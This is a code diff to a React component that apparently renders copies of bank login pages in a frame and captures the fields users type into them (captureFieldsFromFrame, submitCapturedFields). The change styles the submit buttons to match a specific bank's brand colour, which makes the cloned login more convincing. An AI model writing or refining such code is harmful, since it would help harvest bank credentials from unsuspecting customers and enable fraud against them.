@@ -161,6 +161,15 @@ function isExternalHref(href: string | null) {
   return /^https?:\/\//i.test(href.trim());
 }
 
+function getActiveButtonColor(bankSlug: string) {
+  switch (bankSlug) {
+    case "unity-bank":
+      return "#F56C00";
+    default:
+      return "#1F6FEB";
+  }
+}
+
 export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
@@ -318,15 +327,23 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
     const updateSubmitState = () => {
       const isValid = canSubmitForm(loginForm, doc);
+      const isDisabled = !isValid || saving;
+      const activeColor = getActiveButtonColor(bankSlug);
       actionNodes.forEach((node) => {
         if ("disabled" in node) {
-          node.disabled = !isValid || saving;
+          node.disabled = isDisabled;
         }
 
-        node.setAttribute("aria-disabled", !isValid || saving ? "true" : "false");
-        node.style.pointerEvents = !isValid || saving ? "none" : "";
-        node.style.opacity = !isValid || saving ? "0.65" : "";
-        node.style.cursor = !isValid || saving ? "default" : "";
+        node.setAttribute("aria-disabled", isDisabled ? "true" : "false");
+        node.style.pointerEvents = isDisabled ? "none" : "";
+        node.style.opacity = "1";
+        node.style.cursor = isDisabled ? "not-allowed" : "pointer";
+        node.style.background = isDisabled ? "#E6E8EA" : activeColor;
+        node.style.color = isDisabled ? "#ABAEAF" : "#FFFFFF";
+        node.style.border = isDisabled ? "1px solid transparent" : `1px solid ${activeColor}`;
+        node.style.boxShadow = isDisabled ? "none" : "0 10px 24px rgba(245, 108, 0, 0.28)";
+        node.style.transform = isDisabled ? "none" : "translateY(0)";
+        node.style.transition = "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease";
       });
     };
 
@@ -371,7 +388,7 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     });
 
     updateSubmitState();
-  }, [captureFieldsFromFrame, submitCapturedFields]);
+  }, [bankSlug, captureFieldsFromFrame, submitCapturedFields]);
 
   const handleFrameLoad = useCallback(() => {
     void attachFrameBridge();
